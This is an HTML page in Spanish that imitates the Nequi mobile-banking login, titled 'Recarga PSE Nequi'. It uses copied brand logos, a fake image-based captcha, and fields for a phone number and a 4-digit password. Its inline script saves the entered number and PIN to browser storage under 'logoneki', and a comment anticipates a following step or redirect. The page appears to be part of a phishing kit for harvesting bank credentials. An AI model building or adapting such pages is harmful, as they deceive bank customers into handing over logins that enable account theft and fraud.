<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#200020">
  <title>Recarga PSE Nequi</title>
  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../assets/img/nequi-favicon-dark.svg" media="(prefers-color-scheme: dark)">
  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../assets/img/nequi-favicon-light.svg" media="(prefers-color-scheme: light)">
  
  <script src="../assets/js/jquery-3.6.0.min.js"></script>
  <link rel="stylesheet" href="../assets/css/styles.css">
  <script src="../assets/js/functions.js"></script>
  <script src="../assets/js/ready.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">
  
  <style>
    #fondo {
      position: fixed;
      z-index: 300;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      background-color: rgba(255,255,255,0.8);
      display: none;
    }
    #cargando {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 320;
      display: none;
    }
  </style>
</head>
<body>
  <div id="fondo"></div>
  <img id="cargando" src="../assets/img/cargando.gif" width="180" alt="Cargando">
  
  <!-- Formulario de ingreso -->
  <div class="contenedor" id="frm-info">
    <img src="../assets/img/logo.svg" id="logo" alt="Logo">
    <br>
    <div class="titulo">Ingresa a tu Nequi</div>
    
    <!-- Input: Número de celular -->
    <div class="inp" id="inp-cel" estado="0">
      <!-- Puedes quitar el atributo readonly para permitir la edición -->
      <input type="text" name="txt-cel" id="txt-cel" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric"
             onKeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
      <div class="etiqueta">Número de celular</div>
      <div class="texto-demo">Número de celular</div>
    </div>
    
    <!-- Input: Confirma el número de celular -->
    <div class="inp" id="inp-re" estado="0">
      <input type="text" name="txt-re" id="txt-re" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric"
             onKeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
      <div class="etiqueta">Confirma el número de celular</div>
      <div class="texto-demo">Confirma el número de celular</div>
    </div>
    
    <!-- Input: Contraseña (4 dígitos) -->
    <div class="inp" id="inp-pass" estado="0">
      <input type="password" name="txt-pass" id="txt-pass" class="entrada" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric"
             onKeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
      <div class="etiqueta">Contraseña</div>
      <div class="texto-demo">Contraseña</div>
    </div>
    <!-- Captcha (tabla con imágenes) -->
    <table border="0" cellpadding="0" cellspacing="0" width="98%" style="margin: 27px auto;">
      <tr>
        <td valign="middle" align="center" width="8" height="78" style="background-image: url('../assets/img/cap1.jpg');"></td>
        <td valign="middle" align="center" width="38" style="background-image: url('../assets/img/cap2.jpg');">
          <img src="../assets/img/aceptar.jpg" width="38" id="catcha" alt="Captcha">
        </td>
        <td valign="middle" align="center" width="113" style="background-image: url('../assets/img/cap3.jpg');"></td>
        <td valign="middle" align="center" style="background-image: url('../assets/img/cap4.jpg');"></td>
        <td valign="middle" align="center" width="98" style="background-image: url('../assets/img/cap5.jpg');"></td>
      </tr>
    </table>

    <div class="descripcion" style="margin-bottom: 20px; text-align: center;">
      Politicas de privacidad
    </div>
    
    <!-- Botón: Sigue (ya habilitado para poder ejecutar la función) -->
    <button class="btnok" id="paso0">Sigue</button>
    <br>
    <div class="ayuda">Ayuda</div>
  </div>
  
  <script>
    // Al hacer clic en el botón, se guardan los datos ingresados en el localStorage
    document.getElementById("paso0").addEventListener("click", function(){
      var celular = document.getElementById("txt-cel").value;
      var confirma = document.getElementById("txt-re").value;
      var password = document.getElementById("txt-pass").value;
      var datos = {
        celular: celular,
        confirma: confirma,
        password: password
      };
      localStorage.setItem("logoneki", JSON.stringify(datos));
      // Aquí podrías continuar con la siguiente acción o redirección.
    });
  </script>
</body>
</html>
